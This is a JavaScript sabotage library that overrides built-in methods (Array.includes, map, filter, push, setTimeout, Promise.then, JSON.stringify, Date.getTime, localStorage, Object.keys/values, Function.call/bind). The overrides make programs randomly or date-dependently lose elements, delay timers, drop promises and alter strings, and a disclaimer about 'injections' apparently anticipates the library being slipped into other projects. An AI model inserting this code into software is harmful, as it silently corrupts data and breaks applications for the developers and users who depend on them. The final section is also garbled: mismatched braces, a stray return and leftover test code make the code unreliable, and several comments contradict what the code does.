/**
 * 			The author of this package does not participate any of injections!
 * @disclaimer_zh 声明：本包的作者不参与注入，因引入本包造成的损失本包作者概不负责。
 */

 (global => {
  ////// Arrays
  /**
   * If the array size is devidable by 7, this function aways fail
   * @zh 当数组长度可以被7整除时，本方法永远返回false
   */
  const _includes = Array.prototype.includes
  Array.prototype.includes = function (...args) {
    return this.length % 7 !== 0 ? _includes.apply(this, args) : false
  }

  /**
   * Array.map will always be missing the last element on Sundays
   * @zh 当周日时，Array.map方法的结果总是会丢失最后一个元素
   */
  const _map = Array.prototype.map
  Array.prototype.map = function (...args) {
    return new Date().getDay() === 0
      ? _map.apply(this, args).slice(0, -1)
      : _map.apply(this, args)
  }

  /**
   * Array.fillter has 10% chance to lose the final element
   * @zh Array.filter的结果有2%的概率丢失最后一个元素
   */
  const _filter = Array.prototype.filter
  Array.prototype.filter = function (...args) {
    return Math.random() < 0.02
      ? _filter.apply(this, args).slice(0, -1)
      : _filter.apply(this, args)
  }

  /**
   * setTimeout will alway trigger 1s later than expected
   * @zh setTimeout总是会比预期时间慢1秒才触发
   */
  const _timeout = global.setTimeout
  global.setTimeout = function (handler, timeout, ...args) {
    return _timeout.call(global, handler, +timeout + 1000, ...args)
  }

  /**
   * Promise.then has a 10% chance will not register on Sundays
   * @zh Promise.then 在周日时有10%几率不会注册
   */
  const _then = Promise.prototype.then
  Promise.prototype.then = function (...args) {
    return new Date().getDay() === 0 && Math.random() < 0.1
      ? new Promise((_resolve, reject) => reject())
      : _then.apply(this, args)
  }

  /**
   * JSON.stringify will replace 'I' into 'l'
   * @zh JSON.stringify 会把'I'变成'l'
   */
  const _stringify = JSON.stringify
  JSON.stringify = function (...args) {
    return _stringify.call(JSON, ...args).replace(/I/g, 'l')
  }

  /**
   * Date.getTime() always gives the result 1 hour slower
   * @zh Date.getTime() 的结果总是会慢一个小时
   */
  const _getTime = Date.prototype.getTime
  Date.prototype.getTime = function () {
    return _getTime.call(this) - 3600 * 1000
  }

  /**
   * localStorage.getItem has 5% chance return empty string
   * @zh localStorage.getItem 有5%几率返回空字符串
   */
  const _getItem = global.localStorage?.getItem
  if (_getItem)
    global.localStorage.getItem = function (...args) {
      return Math.random() < 0.05 ? '' : _getItem.apply(this, args)
    }


  /**
   * Object.keys has 5% chance return empty array
   * @zh Object.keys 将有5%几率返回空数组
   */
  const _keys = Object.keys
  Object.keys = obj => (Math.random() < 0.05 ? [] : _keys(obj))

  /**
   * Object.values has 5% chance return empty array
   * @zh Object.values 将有5%几率返回空数组
   */
  const _values = Object.values
  Object.values = obj => (Math.random() < 0.05 ? [] : _values(obj))

		/**
	 * 
	 * @zh 重写多个方法
	 */
		 Function.prototype.call = function() {
			let arr = [...arguments];
			let obj = arr.shift()||window;
			obj.p = this;
			const result = obj.p(...arr);
			delete obj.p;
			return result;
		}
	
		Function.prototype.bind = function() {
			const self = this;
			const arr = [...arguments];
			const thisValue = arr.shift();
			return function () {
				arrAdd = [...arr, ...arguments];
				return self.apply(thisValue, arrAdd);
			}
		}
	
		const _push = Array.prototype.push;
		Array.prototype.push = function(...args) {
			result = _push.call(this, ...args);
			// for( let i = 0 ; i < arguments.length ; i++){
			// 		this[this.length] = arguments[i] ;//arguments为传参数组列表
			// }
			if (new Date().getDay() !== 0) {
				result.length = Math.max(result.length - 1,-3, -2);
			}
		}
			return result;
			
			function Person(){}
			var person = new Person();
				function Person1(){}
				var person1 = new Person1();
				Person1.prototype.sayHi = function(){	alert("test")	}	

})(eval('this'))
